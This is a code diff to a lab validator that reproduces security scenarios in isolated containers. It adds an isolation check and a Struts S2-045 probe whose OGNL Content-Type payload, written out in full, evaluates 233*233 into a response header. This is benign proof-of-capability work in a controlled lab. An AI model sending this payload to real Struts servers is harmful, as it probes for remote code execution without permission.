@@ -300,6 +300,70 @@ def _probe_blocked_all_addresses(scenario_id: str, source: str, target: str, por
     return status, observed
 
 
+def _attack_isolation_ok(scenario_id: str, source: str) -> tuple[bool, str]:
+    """Pre-flight guard: an action-specific attack probe may run only from a source
+    container that cannot reach the host or the internet (Phase 3 guard, kept in the
+    product flow). Probes the source's own gateway:22 and two public IPs; any success
+    means NOT isolated and attack probes are withheld (NOT_TESTED), never forced.
+    """
+    script = (
+        "import socket\n"
+        "ip=socket.gethostbyname(socket.gethostname())\n"
+        "gw='.'.join(ip.split('.')[:3])+'.1'\n"
+        "bad=[]\n"
+        "for h,p in [(gw,22),('8.8.8.8',53),('1.1.1.1',443)]:\n"
+        " try:\n  socket.create_connection((h,p),timeout=3).close(); bad.append(f'{h}:{p}')\n"
+        " except OSError: pass\n"
+        "print('REACHED='+(','.join(bad) if bad else 'none'))"
+    )
+    result = manager.probe_in_service(scenario_id, source, script, timeout=15)
+    observed = _result_output(result)
+    if "REACHED=none" in observed:
+        return True, "experiment container cannot reach host gateway:22 or the internet"
+    if "REACHED=" in observed:
+        return False, f"isolation NOT confirmed from {source}: {observed}; attack probe withheld"
+    return False, f"isolation check inconclusive from {source}: {observed}; attack probe withheld"
+
+
+# OGNL arithmetic verification for Struts S2-045 (233*233==54289). Proof of OGNL
+# evaluation only: it adds a response header, never a payload/file/shell.
+_STRUTS_S2045_CT = ("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
+                    ".addHeader('vulhub',233*233)}.multipart/form-data")
+
+
+def _struts_s2045_probe(scenario_id: str, source: str, target: str, port: int) -> tuple[str, str, str, bool]:
+    script = (
+        "import urllib.request\n"
+        f"r=urllib.request.Request('http://{target}:{port}/', data=b'', headers={{'Content-Type': {_STRUTS_S2045_CT!r}}})\n"
+        "try:\n"
+        " resp=urllib.request.urlopen(r, timeout=8)\n"
+        " print('VULHUB_HEADER='+str(resp.headers.get('vulhub')))\n"
+        "except Exception as e:\n"
+        " print('ERR='+type(e).__name__+':'+str(e))"
+    )
+    result = manager.probe_in_service(scenario_id, source, script, timeout=20)
+    observed = _result_output(result)
+    reproduced = "VULHUB_HEADER=54289" in observed
+    expected = "response header vulhub=54289 (server-side OGNL evaluation of 233*233)"
+    status = "PASS" if reproduced else ("FAIL" if "VULHUB_HEADER=" in observed else "NOT_TESTED")
+    return status, expected, observed, reproduced
+
+
+# Action-specific attack probes keyed by the target's catalogue component id. Each is
+# a real, harmless proof-of-capability against the real vulnerable image.
+_ATTACK_PROBES = {
+    "vuln-struts2-s2-045": _struts_s2045_probe,
+}
+
+# Vulnerable images whose faithful probe needs infra not present in a plain product
+# plan (e.g. an in-lab JNDI listener). These are reported NOT_TESTED in-product with a
+# pointer to the standalone Phase 3 harness, never silently PASS.
+_ATTACK_PROBES_NEEDING_INFRA = {
+    "vuln-log4shell-solr": "requires an in-lab JNDI/LDAP listener host; covered by the "
+                           "Phase 3 standalone harness (tests/e2e/phase3-real-poc/run_log4shell_solr.py)",
+}
+
+
 def _build_substitutes(components: list[dict[str, Any]]) -> list[dict[str, Any]]:
     """Build fidelity.substitutes_used, naming the ORIGINAL software the source meant.
 
@@ -467,10 +531,21 @@ def run(scenario_id: str) -> dict[str, Any]:
                 checks.append(check)
 
     connectivity_by_index: dict[int, dict[str, Any]] = {}
-    behavior_by_index: dict[int, dict[str, Any]] = {}
+    # service_behavior = benign liveness (HTTP 200 / pg_isready): LIVENESS evidence only.
+    # attack_behavior  = action-specific attack probes: these alone drive behavior_repro.
+    service_behavior_by_index: dict[int, dict[str, Any]] = {}
+    attack_behavior_by_index: dict[int, dict[str, Any]] = {}
     connectivity_checks: list[dict[str, Any]] = []
-    behavior_checks: list[dict[str, Any]] = []
+    behavior_checks: list[dict[str, Any]] = []  # attack-behavior checks only (see above)
     declared_chain_checks: list[dict[str, Any]] = []
+    isolation_cache: dict[str, tuple[bool, str]] = {}
+    actions_by_host: dict[str, list[str]] = {}
+    for action in actions:
+        tref = action.get("target_host_ref")
+        if isinstance(tref, str):
+            for host in hosts:
+                if _host_ref_eq(tref, host["id"]):
+                    actions_by_host.setdefault(host["id"], []).append(action["id"])
     for index, connection in enumerate(plan_connections, start=1):
         source, target = connection["from_host"], connection["to_host"]
         port = connection.get("port")
@@ -508,58 +583,90 @@ def run(scenario_id: str) -> dict[str, Any]:
 
         resolved_target = component_by_id[target]
         target_component = resolved_target.get("catalogue", {}).get("id") if resolved_target.get("catalogue") else None
-        if target_vm:
-            behavior = _check(f"behavior-{index}", f"{target} 服務行為", "behavior", "NOT_TESTED",
-                              "mapped safe behavior probe", "Windows service behavior mapping is not configured", action_ref)
-            behavior["evidence"] = evidence_path
-            checks.append(behavior)
-            behavior_checks.append(behavior)
-            behavior_by_index[index] = behavior
-        elif target_component in {"oss-nginx", "oss-httpd", "oss-postgres"} or resolved_target["runtime_component"] == "demo-api":
+
+        # (1) Benign LIVENESS check (HTTP 200 / pg_isready). This proves the service
+        # answered; it is NOT attack-behavior reproduction, so it is categorized as
+        # connectivity and must NEVER make behavior_repro PASS (AR2-04 / UXR2-03).
+        if not target_vm and (target_component in {"oss-nginx", "oss-httpd", "oss-postgres"}
+                              or resolved_target["runtime_component"] == "demo-api"):
             if target_component == "oss-postgres":
                 if target_running:
-                    behavior_result = manager.exec_in_service(
+                    live_result = manager.exec_in_service(
                         scenario_id, target,
                         ["pg_isready", "-h", "127.0.0.1", "-p", str(int(port or 5432)), "-U", "postgres", "-d", "postgres"],
-                        timeout=10,
-                    )
-                    behavior_observed = _result_output(behavior_result)
-                    behavior_status = ("PASS" if behavior_result["returncode"] == 0 and
-                                       "accepting connections" in behavior_observed else "FAIL")
+                        timeout=10)
+                    live_observed = _result_output(live_result)
+                    live_status = ("PASS" if live_result["returncode"] == 0 and
+                                   "accepting connections" in live_observed else "FAIL")
                 else:
-                    behavior_status, behavior_observed = "NOT_TESTED", "PostgreSQL container is not running"
-                expected_behavior = "pg_isready reports accepting connections"
+                    live_status, live_observed = "NOT_TESTED", "PostgreSQL container is not running"
+                live_expected = "pg_isready reports accepting connections"
             else:
                 behavior_path = "/demo" if resolved_target["runtime_component"] == "demo-api" else "/"
                 if source_running and target_running and connectivity_status == "PASS":
-                    behavior_result = manager.probe_in_service(
-                        scenario_id, source, _http_probe_script(target, int(port), behavior_path), timeout=10,
-                    )
-                    behavior_observed = _result_output(behavior_result)
+                    live_result = manager.probe_in_service(
+                        scenario_id, source, _http_probe_script(target, int(port), behavior_path), timeout=10)
+                    live_observed = _result_output(live_result)
                     if behavior_path == "/demo":
-                        behavior_ok = (behavior_result["returncode"] == 0 and "HTTP_STATUS:200" in behavior_observed
-                                       and "cr-demo-demo-ok" in behavior_observed)
-                        expected_behavior = "HTTP GET /demo returns cr-demo-demo-ok"
+                        live_ok = (live_result["returncode"] == 0 and "HTTP_STATUS:200" in live_observed
+                                   and "cr-demo-demo-ok" in live_observed)
+                        live_expected = "HTTP GET /demo returns cr-demo-demo-ok"
                     else:
-                        behavior_ok = behavior_result["returncode"] == 0 and "HTTP_STATUS:200" in behavior_observed
-                        expected_behavior = "HTTP GET / returns status 200 from the pinned web server"
-                    behavior_status = "PASS" if behavior_ok else "FAIL"
+                        live_ok = live_result["returncode"] == 0 and "HTTP_STATUS:200" in live_observed
+                        live_expected = "HTTP GET / returns status 200 from the pinned web server"
+                    live_status = "PASS" if live_ok else "FAIL"
                 else:
-                    behavior_status, behavior_observed = "NOT_TESTED", "HTTP behavior was not probed because its path was unavailable"
-                    expected_behavior = "HTTP service returns its expected benign response"
-            behavior = _check(f"behavior-{index}", f"{target} 回傳無害服務回應", "behavior",
-                              behavior_status, expected_behavior, behavior_observed, action_ref)
-            behavior["evidence"] = evidence_path
-            checks.append(behavior)
-            behavior_checks.append(behavior)
-            behavior_by_index[index] = behavior
+                    live_status, live_observed = "NOT_TESTED", "service liveness was not probed because its path was unavailable"
+                    live_expected = "service answers with its expected benign response"
+            live = _check(f"service-liveness-{index}", f"{target} 服務存活（非攻擊行為）", "connectivity",
+                          live_status, live_expected, live_observed, action_ref)
+            live["evidence"] = evidence_path
+            checks.append(live)
+            connectivity_checks.append(live)
+            service_behavior_by_index[index] = live
+
+        # (2) ATTACK-behavior probe: the only thing that drives behavior_repro.
+        mapped_actions = _explicit_action_refs(connection, actions) or actions_by_host.get(target, [])
+        attack = None
+        if target_component in _ATTACK_PROBES and source_running and target_running and connectivity_status == "PASS":
+            if source not in isolation_cache:
+                isolation_cache[source] = _attack_isolation_ok(scenario_id, source)
+            isolated, iso_note = isolation_cache[source]
+            if not isolated:
+                attack = _check(f"attack-{index}", f"{target} 攻擊行為（隔離未確認，未執行）", "behavior",
+                                "NOT_TESTED", "action-specific attack probe", iso_note, action_ref)
+            else:
+                st, exp, obs, _repro = _ATTACK_PROBES[target_component](scenario_id, source, target, int(port))
+                attack = _check(f"attack-{index}", f"{target} 攻擊行為專屬驗證（{target_component}）", "behavior",
+                                st, exp, obs, action_ref)
+        elif target_component in _ATTACK_PROBES_NEEDING_INFRA:
+            attack = _check(f"attack-{index}", f"{target} 攻擊行為（需額外實驗設施，未執行）", "behavior",
+                            "NOT_TESTED", "action-specific attack probe",
+                            _ATTACK_PROBES_NEEDING_INFRA[target_component], action_ref)
+        elif target_vm:
+            attack = _check(f"attack-{index}", f"{target} 攻擊行為（Windows 服務未對應）", "behavior", "NOT_TESTED",
+                            "action-specific attack probe", "Windows service attack mapping is not configured", action_ref)
+        elif mapped_actions:
+            # A scenario action targets this host, but no real attack probe applies here
+            # (harmless substitute / demo). Report it as not reproduced, never PASS.
+            attack = _check(f"attack-{index}", f"{target} 攻擊行為未重現（教學替代）", "behavior", "NOT_TESTED",
+                            "action-specific attack probe",
+                            "no action-specific attack probe applies to this substitute; the attack behavior was not reproduced",
+                            action_ref)
+        if attack is not None:
+            attack["evidence"] = evidence_path
+            checks.append(attack)
+            behavior_checks.append(attack)
+            attack_behavior_by_index[index] = attack
 
         chain_inputs = [connectivity]
-        if index in behavior_by_index:
-            chain_inputs.append(behavior_by_index[index])
+        if index in attack_behavior_by_index:
+            chain_inputs.append(attack_behavior_by_index[index])
+        elif index in service_behavior_by_index:
+            chain_inputs.append(service_behavior_by_index[index])
         else:
             chain_inputs.append(_check(f"chain-unmapped-{index}", "unmapped behavior", "chain", "NOT_TESTED",
-                                       "a mapped benign behavior", "no benign behavior probe exists for the target service"))
+                                       "a mapped benign behavior", "no behavior probe exists for the target service"))
         chain_status = _aggregate(chain_inputs)
         chain = _check(f"chain-{index}", f"{source} 完成至 {target} 的宣告路徑", "chain",
                        chain_status, "declared TCP path and its benign service behavior pass",
@@ -568,8 +675,8 @@ def run(scenario_id: str) -> dict[str, Any]:
         checks.append(chain)
         declared_chain_checks.append(chain)
 
-    # A benign service check without an inbound connection is visible as not tested,
-    # rather than disappearing from the behavior aggregate.
+    # A benign service with no inbound connection is shown as liveness-not-tested. It is
+    # connectivity evidence, not attack behavior, so it does NOT feed behavior_repro.
     connected_targets = {connection["to_host"] for connection in plan_connections if connection.get("port") is not None}
     for component in component_report["components"]:
         host_id = component["host_id"]
@@ -577,12 +684,12 @@ def run(scenario_id: str) -> dict[str, Any]:
         component_id = component_by_id[host_id].get("catalogue", {}).get("id") if component_by_id[host_id].get("catalogue") else None
         has_benign_behavior = runtime_component == "demo-api" or component_id in {"oss-nginx", "oss-httpd", "oss-postgres"}
         if has_benign_behavior and host_id not in connected_targets:
-            check = _check(f"behavior-{host_id}", f"{host_id} 無害服務行為", "behavior", "NOT_TESTED",
+            check = _check(f"service-liveness-{host_id}", f"{host_id} 服務存活（非攻擊行為）", "connectivity", "NOT_TESTED",
                            "a declared source-to-service probe returns the expected response",
                            "no applicable host-to-service connection is declared")
             check["evidence"] = evidence_path
             checks.append(check)
-            behavior_checks.append(check)
+            connectivity_checks.append(check)
 
     blocked_checks: list[dict[str, Any]] = []
     for index, blocked in enumerate(plan.get("verify_blocked", []), start=1):
@@ -614,8 +721,10 @@ def run(scenario_id: str) -> dict[str, Any]:
         checks.append(check)
         blocked_checks.append(check)
 
-    # No attack is executed by this harmless validator. A mapped path provides only
-    # partial evidence for its action; without that prerequisite the action is untested.
+    # An action is reproduced (PASS) only when a real action-specific attack probe
+    # against the mapped target PASSed. A proven connectivity prerequisite alone is
+    # PARTIAL; a failed probe is FAIL; otherwise NOT_TESTED. A benign liveness check
+    # (HTTP 200 / pg_isready) never raises an action above PARTIAL (AR2-04 / UXR2-03).
     action_step_checks: list[dict[str, Any]] = []
     action_step_status: dict[str, str] = {}
     for action in actions:
@@ -623,11 +732,22 @@ def run(scenario_id: str) -> dict[str, Any]:
         related_indexes = [index for index, connection in enumerate(plan_connections, start=1)
                            if action_id in _explicit_action_refs(connection, actions)]
         related_connectivity = [connectivity_by_index[index] for index in related_indexes if index in connectivity_by_index]
+        attack_statuses = [attack_behavior_by_index[index]["status"] for index in related_indexes
+                           if index in attack_behavior_by_index]
         proven_prerequisite = any(check["status"] == "PASS" for check in related_connectivity)
-        status = "PARTIAL" if proven_prerequisite else "NOT_TESTED"
-        observed = ("Only benign service or connectivity prerequisites were verified; the Scenario IR action itself was not executed."
-                    if proven_prerequisite else
-                    "No action-specific safe behavior mapping was exercised; the Scenario IR action was not executed.")
+        if "PASS" in attack_statuses:
+            status = "PASS"
+            observed = "An action-specific attack probe reproduced this behavior against the real target."
+        elif "FAIL" in attack_statuses:
+            status = "FAIL"
+            observed = "An action-specific attack probe ran but the expected effect was not observed."
+        elif proven_prerequisite:
+            status = "PARTIAL"
+            observed = ("Only connectivity/liveness prerequisites were verified; the action-specific "
+                        "attack behavior was not reproduced (substitute or no applicable probe).")
+        else:
+            status = "NOT_TESTED"
+            observed = "No action-specific attack probe was exercised; the Scenario IR action was not executed."
         action_check = _check(f"action-{action_id}", f"情境動作 {action_id}：{action.get('name', action_id)}",
                               "chain", status, "action-specific behavior is executed and verified", observed, action_id)
         action_check["evidence"] = evidence_path
@@ -650,10 +770,10 @@ def run(scenario_id: str) -> dict[str, Any]:
         full_chain = "FAIL"
     else:
         full_chain = "NOT_TESTED"
-    # Structural guarantee: without executed attack steps a full chain can never be
-    # claimed reproduced. Keep this even if the aggregate logic changes later.
-    if full_chain == "PASS":
-        full_chain = "PARTIAL"
+    # full_chain may now legitimately be PASS only when every declared action was
+    # reproduced by a real attack probe AND env/behavior/chain all PASS. If any action
+    # is still NOT_TESTED/PARTIAL/FAIL, _aggregate keeps full_chain below PASS, so a
+    # benign-only run can never claim a reproduced chain.
 
     substitutes = _build_substitutes(component_report["components"])
 
@@ -668,11 +788,15 @@ def run(scenario_id: str) -> dict[str, Any]:
         "levels": {"env_build": env_build, "behavior_repro": behavior_repro, "full_chain": full_chain},
         "level_criteria": {
             "env_build": "僅當每個主機的 service_up 檢查皆為 PASS 時才判定 PASS。",
-            "behavior_repro": "彙總各項獨立執行的無害服務行為檢查。",
+            "behavior_repro": (
+                "只彙總『動作專屬攻擊行為探針』的結果（如 Struts OGNL 求值、Log4Shell 回呼）。"
+                "服務存活檢查（HTTP 200／pg_isready）屬連通性證據，不計入本層，故不會因首頁回應而 PASS。"
+                "部署的是對應漏洞映像且在隔離下探針觀測到攻擊效果才 PASS；教學替代或無對應探針標 NOT_TESTED。"
+            ),
             "full_chain": (
                 "取 env_build、behavior_repro、每條宣告路徑及每個情境 IR 動作（every Scenario IR action）中的最低狀態。"
-                "只有存在安全連線或服務證據時，動作才標為 PARTIAL；此驗證器不會執行攻擊動作。"
-                "任何必要步驟為 NOT_TESTED 或 FAIL 時，整體不可判定為 PASS。"
+                "動作唯有在動作專屬攻擊探針對真實漏洞映像觀測到效果時才為 PASS（真實重現）；"
+                "僅連通性前置成立為 PARTIAL。任何必要步驟為 NOT_TESTED 或 FAIL 時整體不可為 PASS。"
             ),
         },
         "checks": checks,
@@ -683,8 +807,9 @@ def run(scenario_id: str) -> dict[str, Any]:
             "not_tested": not_tested,
             "substitutes_used": substitutes,
             "summary": (
-                "佐證涵蓋容器狀態、指定元件版本、允許與封鎖的 TCP 路徑及無害服務回應。"
-                "沒有動作專屬佐證時，不會宣稱已重現情境動作。"
+                "行為重現層只採信動作專屬攻擊探針（真實漏洞映像＋隔離守門下的真實觀測）。"
+                "服務存活、容器狀態、版本與 TCP 路徑屬環境與連通性佐證，不等於攻擊行為重現。"
+                "沒有動作專屬攻擊佐證時，不會宣稱已重現情境動作。"
             ),
         },
     }
